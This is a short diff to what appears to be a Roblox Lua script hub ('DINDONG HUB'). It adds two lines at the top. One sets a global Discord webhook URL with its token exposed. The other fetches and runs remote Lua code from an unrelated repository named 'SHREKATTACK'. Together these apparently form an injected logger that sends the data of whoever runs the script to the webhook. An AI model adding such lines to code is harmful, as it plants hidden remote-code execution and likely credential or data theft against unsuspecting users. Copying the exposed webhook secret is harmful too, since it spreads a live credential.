@@ -1,3 +1,5 @@
+_G.webhooksdiscord = "https://discord.com/api/webhooks/952534837422608384/SdxPIEPCN4no6wLSaEMoQlIRf7s3uwjS8ZoQNwi80nJR1G1MLVPklORU01hYvV7uFkhk"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
 
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("DINDONG HUB", "DarkTheme")
